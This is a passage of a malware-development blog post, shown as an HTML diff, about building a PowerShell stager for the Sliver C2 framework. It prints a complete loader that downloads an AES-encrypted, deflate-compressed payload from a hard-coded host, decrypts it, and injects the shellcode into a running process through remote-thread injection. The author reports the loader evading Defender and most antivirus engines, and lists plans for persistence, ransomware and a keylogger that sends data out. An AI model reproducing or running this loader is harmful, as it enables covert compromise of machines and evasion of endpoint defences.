+<h3 id="yay-compression-i-guess">Yay Compression&hellip; I Guess</h3>
+<p>When we ran <code>profiles stage</code> to view the configuration options for our stager, listed was flag <code>-c</code> to compress the stage with a variety of compression algorithms such as zlib, gzip, deflate9 or deflate. The usage of this flag seems straightforward enough, we&rsquo;ll use deflate9 along with AES encryption (as that would result in the smallest file size), download the binary, and view the TCP stream as we did in Fig. 4.</p>
+<p><img src="conversation.png" alt="conversation"></p>
+<p><em>Fig 10: Compressed and encrypted binary analysis using wireshark</em></p>
+<p>As you can see, the size of the binary is now 9686 kB, compared to 18 MB before. Additionally, we can observe that the first 16 bytes are the AES IV we provided in the stager configuration. This tells us two things: First, the data is compressed and then encrypted, meaning we have to decrypt and then decompress the binary we download. Second, since the first 16 bytes contain the IV, we must process the data we download by stripping the first 16 bytes so it can be properly decrypted.</p>
+<p>This time sliver did not provide a decompression function in their documentation, but I found a <a href="https://medium.com/@youcef.s.kelouaz/writing-a-sliver-c2-powershell-stager-with-shellcode-compression-and-aes-encryption-9725c0201ea8">blog post</a> from @youcef.s.kelouaz that contained a decompression function written in C# for the Gzip and deflate 9 compression functions. In true hacker fashion let&rsquo;s analyze the source and rewrite it in powershell syntax.</p>
+<pre tabindex="0"><code>public static byte[] Decompress(byte[] data, string CompressionAlgorithm)  
+        {  
+            byte[] decompressedArray = null;  
+            if (CompressionAlgorithm == &#34;deflate9&#34;)  
+            {  
+                using (MemoryStream decompressedStream = new MemoryStream())  
+                {  
+                    using (MemoryStream compressStream = new MemoryStream(data))  
+                    {  
+                        using (DeflateStream deflateStream = new                                           DeflateStream(compressStream, CompressionMode.Decompress)) 
+                        {  
+                            deflateStream.CopyTo(decompressedStream);  
+                        }  
+                    }  
+                    decompressedArray = decompressedStream.ToArray();  
+                }  
+                return decompressedArray;  
+            }  
+            else if (CompressionAlgorithm == &#34;gzip&#34;)  
+            {  
+                using (MemoryStream decompressedStream = new MemoryStream())  
+                {  
+                    using (MemoryStream compressStream = new MemoryStream(data))  
+                    {  
+                        using (GZipStream gzipStream = new                                                 GZipStream(compressStream, CompressionMode.Decompress))  
+                        {  
+                            gzipStream.CopyTo(decompressedStream);  
+                        }  
+                    }  
+                    decompressedArray = decompressedStream.ToArray();  
+                }  
+                return decompressedArray;  
+            }  
+            else  
+            { 
+                return data;  
+            }  
+        }
+</code></pre><p>Similar to the AES decryption process, we need to initialize two memory streams: one for the compressed data and one for the uncompressed data. We then use the appropriate decompression stream, based on the specified compression algorithm and mode, to decompress the data and write the result to a byte array. Doing so, we get this:</p>
+<pre tabindex="0"><code>function Decompress 
+{
+    param 
+    (
+        [byte[]]$Data, [ValidateSet(&#39;deflate9&#39;, &#39;gzip&#39;, &#39;none&#39;)]                           [string]$CompressionAlgorithm
+    )
+
+    $deflateStream = $null
+    $gzipStream = $null
+    $compressedStream = $null
+    $decompressedStream = $null
+
+    try
+    {
+        if ($CompressionAlgorithm -eq &#39;none&#39;) 
+        {
+            return $Data
+        }
+
+        $compressedStream = [System.IO.MemoryStream]::new($Data)
+        $decompressedStream = [System.IO.MemoryStream]::new()
+
+        if ($CompressionAlgorithm -eq &#39;deflate9&#39;) 
+        {
+            $deflateStream =                                                                   [System.IO.Compression.DeflateStream]::new($compressedStream,                      [System.IO.Compression.CompressionMode]::Decompress)
+            $deflateStream.CopyTo($decompressedStream)
+        } 
+        elseif ($CompressionAlgorithm -eq &#39;gzip&#39;) 
+        {
+            $gzipStream =                                                                      [System.IO.Compression.GZipStream]::new($compressedStream,                         [System.IO.Compression.CompressionMode]::Decompress)
+            $gzipStream.CopyTo($decompressedStream)
+        }
+
+        $result = $decompressedStream.ToArray()
+        return $result
+    }
+    catch 
+    {
+        Write-Error &#34;Decompression failed: $_&#34;
+    }
+    finally 
+    {
+        if ($deflateStream) { $deflateStream.Dispose() }
+        if ($gzipStream) { $gzipStream.Dispose() }
+        if ($compressedStream) { $compressedStream.Dispose() }
+        if ($decompressedStream) { $decompressedStream.Dispose() }
+    }
+}
+</code></pre><p>Great, now all we have to do is implement the functions in the script like this:</p>
+<pre tabindex="0"><code># First decrypt the data
+$compressed = Decrypt -FullData $encrypted
+
+# Then decompress the data
+$shellcode = Decompress -Data $compressed -CompressionAlgorithm &#39;deflate9&#39;
+</code></pre><p>The final source looks like this:</p>
+<pre tabindex="0"><code>$Win32 = @&#34;
+using System;
+using System.Runtime.InteropServices;
+public class Win32 
+{
+    [DllImport(&#34;kernel32.dll&#34;, SetLastError=true)]
+    public static extern IntPtr OpenProcess(uint DesiredAccess, bool                   bInheritHandle, int ProcessID);
+
+    [DllImport(&#34;kernel32.dll&#34;, SetLastError=true)]
+    public static extern IntPtr VirtualAllocEx(IntPtr Process, IntPtr                  StartAddress, UIntPtr shellcodeSize, uint AllocationType, uint                     MemProtectConstraint);
+
+    [DllImport(&#34;kernel32.dll&#34;, SetLastError=true)]
+    public static extern bool WriteProcessMemory(IntPtr Process, IntPtr StartAddr,     byte[] Shellcode, uint shellSize, out UIntPtr BytesWritten);
+
+    [DllImport(&#34;kernel32.dll&#34;, SetLastError=true)]
+    public static extern IntPtr CreateRemoteThread(IntPtr Process, IntPtr              threadAttrib, uint stackSize, IntPtr shellcodeAddr, IntPtr additionalParams,       uint creationFlags, out IntPtr lpThreadId);
+}
+&#34;@
+Add-Type $Win32
+
+# Function for decompressing data
+function Decompress 
+{
+    param 
+    (
+        [byte[]]$Data, [ValidateSet(&#39;deflate9&#39;, &#39;gzip&#39;, &#39;none&#39;)]                           [string]$CompressionAlgorithm
+    )
+
+    $deflateStream = $null
+    $gzipStream = $null
+    $compressedStream = $null
+    $decompressedStream = $null
+
+    try
+    {
+        if ($CompressionAlgorithm -eq &#39;none&#39;) 
+        {
+            return $Data
+        }
+
+        $compressedStream = [System.IO.MemoryStream]::new($Data)
+        $decompressedStream = [System.IO.MemoryStream]::new()
+
+        if ($CompressionAlgorithm -eq &#39;deflate9&#39;) 
+        {
+            $deflateStream =                                                                   [System.IO.Compression.DeflateStream]::new($compressedStream,                      [System.IO.Compression.CompressionMode]::Decompress)
+            $deflateStream.CopyTo($decompressedStream)
+        } 
+        elseif ($CompressionAlgorithm -eq &#39;gzip&#39;) 
+        {
+            $gzipStream =                                                                      [System.IO.Compression.GZipStream]::new($compressedStream,                         [System.IO.Compression.CompressionMode]::Decompress)
+            $gzipStream.CopyTo($decompressedStream)
+        }
+
+        $result = $decompressedStream.ToArray()
+        return $result
+    }
+    catch 
+    {
+        Write-Error &#34;Decompression failed:&#34;
+    }
+    finally 
+    {
+        if ($deflateStream) { $deflateStream.Dispose() }
+        if ($gzipStream) { $gzipStream.Dispose() }
+        if ($compressedStream) { $compressedStream.Dispose() }
+        if ($decompressedStream) { $decompressedStream.Dispose() }
+    }
+}
+
+# Function for AES decryption
+function Decrypt 
+{
+    param ([byte[]]$FullData)
+
+    $key =                                                                             [System.Text.Encoding]::UTF8.GetBytes(&#39;D(G+KbPeShVmYq3t6v9y$B&amp;E)H@McQfT&#39;)
+    $iv = [System.Text.Encoding]::UTF8.GetBytes(&#39;8y/B?E(G+KbPeShV&#39;)
+    $cipherText = $FullData[16..($FullData.Length - 1)]
+
+    $aesAlg = [System.Security.Cryptography.Aes]::Create()
+    $decryptor = $null
+    $memoryStream = $null
+    $cryptoStream = $null
+
+    try 
+    {
+        $aesAlg.Key = $key
+        $aesAlg.IV = $iv
+        $aesAlg.Padding = [System.Security.Cryptography.PaddingMode]::None
+        $aesAlg.Mode = [System.Security.Cryptography.CipherMode]::CBC
+
+        $decryptor = $aesAlg.CreateDecryptor()
+        $memoryStream = [System.IO.MemoryStream]::new()
+        $cryptoStream =                                                                    [System.Security.Cryptography.CryptoStream]::new($memoryStream,                    $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
+
+        $cryptoStream.Write($cipherText, 0, $cipherText.Length)
+        $cryptoStream.FlushFinalBlock()
+
+        $result = $memoryStream.ToArray()
+        return $result
+    }
+    catch 
+    {
+        Write-Error &#34;Decryption failed: $_&#34;
+    }
+    finally 
+    {
+        if ($cryptoStream) { $cryptoStream.Dispose() }
+        if ($memoryStream) { $memoryStream.Dispose() }
+        if ($decryptor) { $decryptor.Dispose() }
+        if ($aesAlg) { $aesAlg.Dispose() }
+    }
+}
+
+
+# Download encrypted and compressed data
+$encrypted = (New-Object System.Net.WebClient).DownloadData(&#34;http://192.168.7.130/rev.woff?x=1279&#34;)
+if (-not $encrypted) { Exit }
+
+# First decrypt the data
+$compressed = Decrypt -FullData $encrypted
+
+# Then decompress the data
+$shellcode = Decompress -Data $compressed -CompressionAlgorithm &#39;deflate9&#39;
+$size = [System.UIntPtr]::new($shellcode.Length)
+
+# Get the target process
+$targetProcess = Get-Process -Name cmd | Select-Object -First 1
+$processId = $targetProcess.Id
+
+# Open target process
+$process = [Win32]::OpenProcess(0x001FFFFF, $false, $processId)
+
+# Allocate memory in the target process
+$memAddr = [Win32]::VirtualAllocEx($process, [System.IntPtr]::Zero, $size, 0x3000, 0x40)
+
+# Write the shellcode to allocated memory
+$writtenBytes = [System.UIntPtr]::Zero
+[Win32]::WriteProcessMemory($process, $memAddr, $shellcode, [uint32]$size.ToUInt32(), [ref]$writtenBytes)
+
+# Execute the shellcode
+$threadID = [System.IntPtr]::Zero
+[Win32]::CreateRemoteThread($process, [System.IntPtr]::Zero, 0, $memAddr, [System.IntPtr]::Zero, 0, [ref]$threadID)
+
+Write-Output &#34;Injection complete.&#34;
+
+$PID
+</code></pre><p>Updates to this script will be uploaded in the <a href="https://github.com/Indigo-10/MalDev/blob/main/ProcessInject.ps1">Github Repo</a>.</p>
+<h2 id="final-testing-and-thoughts">Final Testing and Thoughts</h2>
+<p>Lets turn defender on and see if we can get a shell from our script.</p>
+<p><img src="FUD.gif" alt="FUD-crop"></p>
+<p><em>Fig 11: FUD Sliver C2 Process Injection Using AES Encryption and Deflate9 Compression</em></p>
+<p>Due to the heavy compression, it takes around three minutes before we get a shell, but we can see that we do eventually inject into svchost and execute our shellcode fully undetected thanks to AES encryption and compressions.</p>
+<p>Running my script through Kleenscan, it was only detected by 3/40 AV engines under the detection label &ldquo;Heur.BZC.PZQ.Boxter.829.565F37F3&rdquo;. In the effort of not signaturing this script, I won&rsquo;t upload it to VirusTotal; however, knowing that our initial script was detected under &ldquo;Heur.BZC.PZQ.Boxter.829.565F37F3&rdquo; seven times, we can safely assume we would be detected by 7/61 AV engines, a respectable decrease from 16/61.</p>
+<p>This was an insanely fulfilling project to complete, doing so feels like I&rsquo;ve cured a career-long imposter syndrome that came from being unable to write my own malware. I&rsquo;ve wanted to dabble in malware development for a long time, and I feel like this was a great first project for me to do so.</p>
+<h3 id="for-next-time">For Next Time</h3>
+<p>For my first &ldquo;tool&rdquo; I think it has a lot of potential. Here&rsquo;s my list of ideas on how I can build this out and improve it.</p>
+<ol>
+<li>Migrate this over to C# lol. I&rsquo;ve received mass criticism from my peers writing this in powershell, but I suck at coding. I was given a template and I decided to work with it for now. I will admit, learning to deconstruct C# functions and write them in powershell has helped my comfortability a lot.</li>
+<li>We should add some form of persistence.</li>
+<li>Given I can be destructive and troll, we&rsquo;re going to do some trolling. Me and another teammate may be working on a ransomware implementation I&rsquo;ll write about after the competition.</li>
+<li>Learn how to hide my C2 infrastructure.</li>
+<li>If I can modularize this and build a full application that has methods for different forms of injection and such, that would be great. Essentially make this my own hacktool.</li>
+<li>Everything is hardcoded, works for now, but it&rsquo;d be nice to pass arguments in the command line.</li>
+<li>Some of my friends are yapping about something called vectored exception handlers, I&rsquo;ll read up on this and get back to you.</li>
+<li>The way I select my services is unreliable, it some processes may crash, or will explicitly deny being manipulated</li>
+<li>I want to write a FUD keylogger that doesn&rsquo;t store its logs on disk but instead sends information back to a central server.</li>
+<li>Long term - rookit???</li>
+<li>World domination</li>
+</ol>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
